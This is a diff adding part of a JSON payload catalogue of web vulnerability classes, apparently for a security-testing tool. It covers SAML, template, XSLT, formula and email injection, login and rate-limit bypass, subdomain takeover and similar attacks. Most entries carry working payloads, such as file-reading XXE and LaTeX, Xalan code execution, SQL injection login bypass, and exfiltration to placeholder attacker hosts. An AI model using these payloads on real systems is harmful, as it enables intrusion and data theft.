+      "description": "SAML attacks exploit weaknesses in Security Assertion Markup Language implementation including XML signature wrapping, comment injection in NameID, and replay attacks to bypass authentication or forge identity assertions.",
+      "vuln_type": "auth-bypass",
+      "aliases": ["saml", "saml injection", "saml bypass", "xml signature wrapping"],
+      "payloads": [
+        {"context": "XML signature wrapping", "payload": "# Move signed assertion to extension; inject unsigned forged assertion at expected location", "note": "XSW attack: signature validates but wrong element used for authz"},
+        {"context": "Comment injection", "payload": "<NameID>admin<!--</NameID><NameID>victim--></NameID>", "note": "Comment breaks parser; some libraries use 'victim' but others use 'admin'"},
+        {"context": "XXE in SAML", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>...<NameID>&xxe;</NameID>", "note": "XXE via SAML XML if external entities enabled in parser"}
+      ],
+      "commands": [
+        {
+          "name": "SAML Raider (Burp extension)",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "# Burp Extension: SAML Raider; intercept SAML request; try XSW attacks automatically",
+          "note": "Generates all 8 XSW variants automatically"
+        }
+      ],
+      "see_also": ["oauth-to-account-takeover", "hacking-jwt-json-web-tokens", "xxe-xee-xml-external-entity"]
+    },
+    "client-side-template-injection-csti": {
+      "name": "CSTI",
+      "full_name": "Client-Side Template Injection (CSTI)",
+      "description": "CSTI occurs when user input is embedded in client-side template engines (AngularJS, VueJS, Mavo) and evaluated, leading to JavaScript execution in the victim's browser without server-side reflection.",
+      "vuln_type": "xss",
+      "aliases": ["csti", "client side template injection", "angularjs injection", "angular injection"],
+      "payloads": [
+        {"context": "AngularJS v1 basic", "payload": "{{7*7}}", "note": "Returns 49 if AngularJS is processing input"},
+        {"context": "AngularJS v1 alert", "payload": "{{constructor.constructor('alert(1)')()}}", "note": "Execute alert via constructor chain"},
+        {"context": "AngularJS v1 sandbox bypass", "payload": "{{\"a\".constructor.prototype.charAt=[].join;$eval(\"x='alert(1)'\");\"a\".constructor.prototype.charAt=String.prototype.charAt}}", "note": "AngularJS 1.x sandbox escape"},
+        {"context": "VueJS 2 RCE", "payload": "{{_c.constructor('alert(1)')()}}", "note": "Vue.js 2 template injection"},
+        {"context": "Mavo injection", "payload": "[7*7]", "note": "Mavo framework uses [] for expressions"}
+      ],
+      "commands": [],
+      "see_also": ["xss-cross-site-scripting", "ssti-server-side-template-injection"]
+    },
+    "dangling-markup-html-scriptless-injection": {
+      "name": "Dangling Markup",
+      "full_name": "Dangling Markup / HTML Scriptless Injection",
+      "description": "Dangling markup injection exploits cases where attackers can inject partial HTML tags that 'dangle' open, causing the browser to include subsequent page content (tokens, nonces, CSRF tokens) as part of an attribute value sent to an attacker-controlled server.",
+      "vuln_type": "xss",
+      "aliases": ["dangling markup", "scriptless injection", "html injection"],
+      "payloads": [
+        {"context": "Steal data with img src dangling", "payload": "<img src='https://{ATTACKER}/?", "note": "Unclosed src attribute; browser fetches URL + page content up to next quote"},
+        {"context": "Steal CSRF token", "payload": "<form action='https://{ATTACKER}'><input name='csrf' value='", "note": "If CSRF token appears after injection point; token captured in URL"},
+        {"context": "Meta refresh exfil", "payload": "<meta http-equiv='refresh' content='0;URL=https://{ATTACKER}/?", "note": "Redirect captures following content in URL"}
+      ],
+      "commands": [],
+      "see_also": ["xss-cross-site-scripting", "content-security-policy-csp-bypass"]
+    },
+    "registration-vulnerabilities": {
+      "name": "Registration Flaws",
+      "full_name": "User Registration Vulnerabilities",
+      "description": "Registration vulnerabilities including username enumeration, email normalization bypass, registration with existing usernames (race condition), and pre-hijacking attacks allow account takeover before or during account creation.",
+      "vuln_type": "auth-bypass",
+      "aliases": ["registration vulnerability", "account pre-hijacking", "username enumeration"],
+      "payloads": [
+        {"context": "Email unicode normalization", "payload": "victim＠example.com", "note": "Fullwidth @ U+FF20; may register as victim@example.com in some systems"},
+        {"context": "Pre-hijacking (merge attack)", "payload": "# Register attacker@gmail.com (victim email) before victim; link social login later", "note": "After victim uses social login, attacker account merged with victim's"},
+        {"context": "Username case collision", "payload": "ADMIN (when 'admin' exists)", "note": "Case-insensitive usernames may collide with existing accounts"}
+      ],
+      "commands": [],
+      "see_also": ["account-takeover", "reset-password", "2fa-bypass"]
+    },
+    "xslt-server-side-injection-extensible-stylesheet-language-transformations": {
+      "name": "XSLT Injection",
+      "full_name": "XSLT Server-Side Injection",
+      "description": "XSLT injection occurs when attacker-controlled XSLT stylesheets are processed server-side, enabling file read, SSRF, and in some implementations (Saxon, Xalan) arbitrary Java/code execution.",
+      "vuln_type": "injection",
+      "aliases": ["xslt injection", "xslt", "xsl injection"],
+      "payloads": [
+        {"context": "Version detection", "payload": "<xsl:value-of select=\"system-property('xsl:version')\" />", "note": "Reveals XSLT processor version"},
+        {"context": "File read (Saxon)", "payload": "<xsl:value-of select=\"unparsed-text('/etc/passwd')\" />", "note": "Read local files via unparsed-text()"},
+        {"context": "SSRF (document())", "payload": "<xsl:value-of select=\"document('http://{ATTACKER}/')\" />", "note": "Make HTTP request via document() function"},
+        {"context": "Java RCE (Xalan)", "payload": "<xsl:value-of select=\"rt:exec(rt:getRuntime(),'id')\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" />", "note": "Xalan Java extension for RCE"}
+      ],
+      "commands": [],
+      "see_also": ["xxe-xee-xml-external-entity", "ssti-server-side-template-injection", "ssrf-server-side-request-forgery"]
+    },
+    "orm-injection": {
+      "name": "ORM Injection",
+      "full_name": "ORM Injection (Hibernate, SQLAlchemy, ActiveRecord)",
+      "description": "ORM injection exploits unsafe use of ORM query builders where user input is passed directly to raw queries or where ORM-specific query languages have their own injection vectors (HQL, JPQL, ActiveRecord conditions).",
+      "vuln_type": "injection",
+      "aliases": ["orm injection", "hql injection", "jpql injection", "hibernate injection"],
+      "payloads": [
+        {"context": "HQL injection (Hibernate)", "payload": "' OR '1'='1", "note": "HQL tautology; similar to SQL injection syntax"},
+        {"context": "HQL UNION", "payload": "x' UNION SELECT username, password FROM users-- ", "note": "If HQL SELECT queries vulnerable"},
+        {"context": "ActiveRecord injection (Rails)", "payload": "order=id) UNION SELECT...", "note": "If .order() uses raw string from user input"}
+      ],
+      "commands": [],
+      "see_also": ["sql-injection", "nosql-injection"]
+    },
+    "rsql-injection": {
+      "name": "RSQL Injection",
+      "full_name": "RSQL Injection",
+      "description": "RSQL (RESTful SQL) injection targets APIs using RSQL query language (common in Spring Data REST, QueryDSL) where user-controlled filter expressions are parsed without proper sanitization, enabling unauthorized data access.",
+      "vuln_type": "injection",
+      "aliases": ["rsql", "rsql injection", "fiql injection"],
+      "payloads": [
+        {"context": "RSQL enumeration bypass", "payload": "username==admin", "note": "RSQL equality filter; == is the operator"},
+        {"context": "RSQL wildcard", "payload": "username==adm*", "note": "Wildcard matching in RSQL"},
+        {"context": "RSQL OR condition", "payload": "role==user,role==admin", "note": "Comma is OR in RSQL; semicolon is AND"}
+      ],
+      "commands": [],
+      "see_also": ["sql-injection", "nosql-injection"]
+    },
+    "email-injections": {
+      "name": "Email Injection",
+      "full_name": "Email Header Injection & SMTP Injection",
+      "description": "Email injection exploits user-controlled data embedded in email headers or SMTP commands, enabling spamming, header injection to add recipients (Cc, Bcc), and SMTP command injection.",
+      "vuln_type": "injection",
+      "aliases": ["email injection", "smtp injection", "mail injection", "header injection"],
+      "payloads": [
+        {"context": "CC header injection", "payload": "victim@example.com%0aCc:attacker@evil.com", "note": "CRLF in email field adds CC header; sends copy to attacker"},
+        {"context": "BCC injection", "payload": "victim@example.com%0aBcc:attacker@evil.com", "note": "Blind carbon copy injection for silent exfiltration"},
+        {"context": "Subject injection", "payload": "Subject: Legit%0aTo:spam@spam.com", "note": "Inject new To header via subject field"},
+        {"context": "SMTP injection", "payload": "RCPT TO: attacker@evil.com", "note": "If user input lands in SMTP DATA section or RCPT command"}
+      ],
+      "commands": [],
+      "see_also": ["command-injection", "crlf-0d-0a"]
+    },
+    "formula-csv-doc-latex-ghostscript-injection": {
+      "name": "Formula Injection",
+      "full_name": "Formula / CSV / Doc / LaTeX Injection",
+      "description": "Formula injection (CSV injection) exploits spreadsheet export features where user data beginning with =, +, -, @ is interpreted as formulas by Excel/Calc, enabling DDE command execution or data exfiltration. LaTeX injection enables file read and RCE in PDF generation.",
+      "vuln_type": "injection",
+      "aliases": ["csv injection", "formula injection", "latex injection", "dde injection", "spreadsheet injection"],
+      "payloads": [
+        {"context": "Excel DDE injection", "payload": "=DDE(\"cmd\",\"/C calc\",\"\")", "note": "Excel DDE command execution via injected formula"},
+        {"context": "CSV formula injection", "payload": "=HYPERLINK(\"http://{ATTACKER}/?d=\"&A1,\"click\")", "note": "Exfiltrate cell data to attacker URL"},
+        {"context": "CSV cmd execution", "payload": "=cmd|' /C nslookup {ATTACKER}'!A0", "note": "DDE command via pipe in formula"},
+        {"context": "LaTeX file read", "payload": "\\input{/etc/passwd}", "note": "Include local file in LaTeX document"},
+        {"context": "LaTeX command execution", "payload": "\\write18{id > /tmp/out.txt}", "note": "Shell escape in LaTeX; requires --shell-escape flag"},
+        {"context": "LaTeX file exfiltration", "payload": "\\newread\\f\\openin\\f{/etc/passwd}\\read\\f to\\line\\text{\\line}\\closein\\f", "note": "Read and display file contents in PDF"}
+      ],
+      "commands": [],
+      "see_also": ["command-injection", "xxe-xee-xml-external-entity"]
+    },
+    "uuid-insecurities": {
+      "name": "UUID Insecurities",
+      "full_name": "UUID Version Vulnerabilities",
+      "description": "UUID version 1 contains the MAC address and timestamp, making it predictable. UUID v3/v5 are deterministic (MD5/SHA1 of namespace+name). These properties can enable IDOR exploitation and session token prediction.",
+      "vuln_type": "misc",
+      "aliases": ["uuid", "guid", "uuid v1", "uuid prediction"],
+      "payloads": [
+        {"context": "Extract MAC from UUID v1", "payload": "python3 -c \"import uuid; u=uuid.UUID('{UUID}'); print(hex(u.node))\"", "note": "Node field = MAC address; time fields leak creation timestamp"},
+        {"context": "Predict UUID v1 sequence", "payload": "# Use uuid-tool or guidtool to extract timestamp and enumerate nearby UUIDs", "note": "If UUIDs are sequential and time-based, enumerate around known values"}
+      ],
+      "commands": [],
+      "see_also": ["idor", "account-takeover"]
+    },
+    "timing-attacks": {
+      "name": "Timing Attacks",
+      "full_name": "Web Timing Attacks",
+      "description": "Timing attacks infer sensitive information from response time differences caused by non-constant-time comparisons of secrets (passwords, tokens, HMAC), enabling username enumeration, secret extraction, and bypass of timing-based rate limits.",
+      "vuln_type": "misc",
+      "aliases": ["timing attack", "side channel", "time based oracle"],
+      "payloads": [
+        {"context": "Username enumeration via timing", "payload": "# Send requests for valid vs invalid usernames; valid usernames take longer if password hash is computed", "note": "Measure response time difference across many requests"},
+        {"context": "Password comparison timing", "payload": "# Brute-force first byte: response time difference reveals correct byte if comparison is non-constant-time", "note": "Requires many samples to reduce noise; use network jitter compensation"}
+      ],
+      "commands": [
+        {
+          "name": "timing-attack with curl",
+          "platform": "linux",
+          "category": "detection",
+          "command": "for user in $(cat usernames.txt); do printf \"$user: \"; curl -s -o /dev/null -w \"%{time_total}\" -X POST \"{URL}\" -d \"username=$user&password=wrong\"; echo; done",
+          "note": "Compare response times to enumerate valid usernames"
+        }
+      ],
+      "see_also": ["race-condition", "2fa-bypass"]
+    },
+    "login-bypass": {
+      "name": "Login Bypass",
+      "full_name": "Authentication Login Bypass",
+      "description": "Login bypass techniques exploit SQL injection in login forms, NoSQL operator injection, default credentials, and logic flaws in authentication flows to gain unauthorized access.",
+      "vuln_type": "auth-bypass",
+      "aliases": ["login bypass", "auth bypass", "authentication bypass"],
+      "payloads": [
+        {"context": "SQLi login bypass", "payload": "admin'--", "note": "Comment out password check in SQL query"},
+        {"context": "SQLi login bypass (OR)", "payload": "' OR 1=1--", "note": "Always-true condition in WHERE clause"},
+        {"context": "NoSQL login bypass", "payload": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "note": "MongoDB $ne operator bypasses password check"},
+        {"context": "Default credentials", "payload": "admin:admin, admin:password, admin:123456, guest:guest", "note": "Try common default credentials first"}
+      ],
+      "commands": [],
+      "see_also": ["sql-injection", "nosql-injection", "2fa-bypass"]
+    },
+    "rate-limit-bypass": {
+      "name": "Rate Limit Bypass",
+      "full_name": "Rate Limit Bypass Techniques",
+      "description": "Rate limit bypass techniques exploit IP rotation, header spoofing (X-Forwarded-For), and endpoint variations to bypass login throttling, API rate limits, and OTP brute-force protections.",
+      "vuln_type": "misc",
+      "aliases": ["rate limit bypass", "rate limiting bypass", "throttle bypass"],
+      "payloads": [
+        {"context": "IP spoofing bypass", "payload": "X-Forwarded-For: 1.2.3.4", "note": "If rate limit uses XFF for IP; rotate values to bypass"},
+        {"context": "IP variation headers", "payload": "X-Real-IP: 1.2.3.4\nX-Client-IP: 1.2.3.4\nTrue-Client-IP: 1.2.3.4\nCF-Connecting-IP: 1.2.3.4", "note": "Try different IP headers; rotate values for each request"},
+        {"context": "Endpoint variation", "payload": "/api/login vs /API/Login vs /api/login/", "note": "Different URL capitalizations/trailing slashes may have separate rate limit counters"},
+        {"context": "Email case variation", "payload": "victim@example.com vs Victim@example.com vs VICTIM@example.com", "note": "Different cases counted separately by some rate limiters"}
+      ],
+      "commands": [],
+      "see_also": ["2fa-bypass", "login-bypass", "race-condition"]
+    },
+    "dependency-confusion": {
+      "name": "Dependency Confusion",
+      "full_name": "Dependency Confusion Attack",
+      "description": "Dependency confusion exploits package manager priority rules where internal package names are hijacked by publishing public packages with the same name at higher version numbers, causing build systems to fetch attacker-controlled code.",
+      "vuln_type": "misc",
+      "aliases": ["dependency confusion", "namespace confusion", "supply chain attack"],
+      "payloads": [
+        {"context": "PyPI confusion", "payload": "# Publish pip package 'internal-package-name' at version 9999.0.0", "note": "pip prefers PyPI over private registries; higher version wins"},
+        {"context": "npm confusion", "payload": "# Publish npm package with internal package name at high version", "note": "npm may check public registry before private; depends on .npmrc config"},
+        {"context": "Ruby gems confusion", "payload": "# Publish rubygems package at high version matching internal gem name", "note": "Check Gemfile.lock for internal gem names"}
+      ],
+      "commands": [],
+      "see_also": []
+    },
+    "domain-subdomain-takeover": {
+      "name": "Subdomain Takeover",
+      "full_name": "Domain/Subdomain Takeover",
+      "description": "Subdomain takeover occurs when a DNS record (CNAME/A) points to a service that no longer claims that hostname, allowing an attacker to register the service and serve content from the organization's subdomain for phishing or cookie theft.",
+      "vuln_type": "misc",
+      "aliases": ["subdomain takeover", "domain takeover", "dangling dns"],
+      "payloads": [
+        {"context": "GitHub Pages takeover", "payload": "CNAME: org.github.io → claim via GitHub Pages settings", "note": "If CNAME points to unclaimed GitHub Pages site"},
+        {"context": "Heroku dangling CNAME", "payload": "CNAME: app-name.herokuapp.com → register new Heroku app with that name", "note": "Create Heroku app matching the dangling CNAME target"},
+        {"context": "S3 bucket takeover", "payload": "CNAME: bucket-name.s3.amazonaws.com → create matching S3 bucket", "note": "Create S3 bucket in same region with matching name"}
+      ],
+      "commands": [
+        {
+          "name": "subjack subdomain takeover scan",
+          "platform": "linux",
+          "category": "detection",
+          "command": "subjack -w subdomains.txt -t 100 -o results.txt -ssl",
+          "note": "Automated subdomain takeover detection"
+        },
+        {
+          "name": "nuclei takeover templates",
+          "platform": "linux",
+          "category": "detection",
+          "command": "nuclei -l subdomains.txt -t takeovers/",
+          "note": "Nuclei templates for common takeover scenarios (S3, GitHub Pages, etc.)"
+        }
+      ],
+      "see_also": ["cors-bypass", "xss-cross-site-scripting"]
+    },
+    "postmessage-vulnerabilities": {
+      "name": "postMessage Vulnerabilities",
+      "full_name": "postMessage Security Vulnerabilities",
+      "description": "postMessage security issues arise when the receiving window fails to validate the message origin, enabling cross-origin message injection, data exfiltration from iframes, and XSS if message content is written to the DOM unsafely.",
+      "vuln_type": "client-side",
+      "aliases": ["postmessage", "post message", "window.postmessage"],
+      "payloads": [
+        {"context": "Exploit missing origin check", "payload": "window.open('https://{TARGET}').postMessage('{PAYLOAD}','*')", "note": "Send message without origin restriction; target receives without validation"},
+        {"context": "Steal data via postMessage", "payload": "<iframe src='https://{TARGET}' onload='this.contentWindow.postMessage({\"action\":\"getData\"},\"*\")'></iframe>", "note": "If target responds to postMessage without origin check; steal response"}
+      ],
+      "commands": [],
+      "see_also": ["xss-cross-site-scripting", "cors-bypass", "clickjacking"]
+    },
+    "captcha-bypass": {
+      "name": "CAPTCHA Bypass",
+      "full_name": "CAPTCHA Bypass Techniques",
+      "description": "CAPTCHA bypass exploits poor implementation including reusable captcha tokens, image-based captchas solvable by OCR/AI services, missing server-side validation, and logic bypasses.",
+      "vuln_type": "misc",
+      "aliases": ["captcha bypass", "recaptcha bypass"],
+      "payloads": [
+        {"context": "Remove captcha param", "payload": "# Delete captcha field from POST body entirely", "note": "Some apps only validate if captcha param is present"},
+        {"context": "Reuse captcha token", "payload": "# Solve captcha once; replay token in subsequent requests", "note": "Tokens should be single-use; check if server validates uniqueness"},
+        {"context": "Old captcha reuse", "payload": "# Use expired/used captcha token from earlier interaction", "note": "Check if server enforces expiry"}
+      ],
+      "commands": [],
+      "see_also": ["rate-limit-bypass", "2fa-bypass"]
+    },
+    "bypass-payment-process": {
+      "name": "Payment Bypass",
+      "full_name": "Payment Process Bypass",
+      "description": "Payment bypass vulnerabilities exploit client-side price manipulation, race conditions on discount application, parameter tampering in checkout flow, and negative price values to purchase items at reduced or zero cost.",
+      "vuln_type": "access-control",
+      "aliases": ["payment bypass", "price manipulation", "cart manipulation"],
+      "payloads": [
+        {"context": "Price parameter manipulation", "payload": "price=0.01&quantity=1", "note": "If price is sent client-side in form/AJAX; change to minimal value"},
+        {"context": "Negative quantity", "payload": "quantity=-1", "note": "Negative quantity may result in credit instead of charge"},
+        {"context": "Coupon code stacking race", "payload": "# Apply coupon multiple times in parallel via race condition", "note": "Parallel requests may bypass single-use coupon check"}
+      ],
+      "commands": [],
+      "see_also": ["race-condition", "idor", "mass-assignment-cwe-915"]
+    }
+  },
+  "type_index": {
+    "injection": [
+      "sql-injection",
+      "command-injection",
+      "nosql-injection",
+      "ldap-injection",
+      "xpath-injection",
+      "xslt-server-side-injection-extensible-stylesheet-language-transformations",
+      "orm-injection",
+      "rsql-injection",
+      "email-injections",
+      "formula-csv-doc-latex-ghostscript-injection"
+    ],
+    "xss": [
+      "xss-cross-site-scripting",
+      "dom-xss",
+      "client-side-template-injection-csti",
+      "dangling-markup-html-scriptless-injection"
+    ],
+    "xxe": [
+      "xxe-xee-xml-external-entity"
+    ],
+    "ssrf": [
+      "ssrf-server-side-request-forgery"
+    ],
+    "ssti": [
+      "ssti-server-side-template-injection"
+    ],
+    "auth-bypass": [
+      "2fa-bypass",
+      "oauth-to-account-takeover",
+      "hacking-jwt-json-web-tokens",
+      "saml-attacks",
+      "login-bypass",
+      "reset-password",
+      "registration-vulnerabilities"
+    ],
+    "access-control": [
+      "idor",
+      "mass-assignment-cwe-915",
+      "account-takeover",
+      "bypass-payment-process"
+    ],
+    "request-manipulation": [
+      "http-request-smuggling",
+      "cors-bypass",
+      "content-security-policy-csp-bypass",
+      "crlf-0d-0a",
+      "abusing-hop-by-hop-headers",
+      "h2c-smuggling"
+    ],
+    "file-based": [
+      "file-inclusion",
+      "file-upload"
+    ],
+    "deserialization": [
+      "deserialization"
+    ],
+    "client-side": [
+      "csrf-cross-site-request-forgery",
+      "clickjacking",
+      "hacking-with-cookies",
+      "postmessage-vulnerabilities",
+      "websocket-attacks"
+    ],
+    "misc": [
+      "open-redirect",
+      "race-condition",
+      "regular-expression-denial-of-service-redos",
+      "parameter-pollution",
+      "proxy-waf-protections-bypass",
+      "cache-deception",
+      "uuid-insecurities",
+      "timing-attacks",
+      "rate-limit-bypass",
+      "dependency-confusion",
+      "domain-subdomain-takeover",
+      "captcha-bypass"
+    ]
+  }
+}
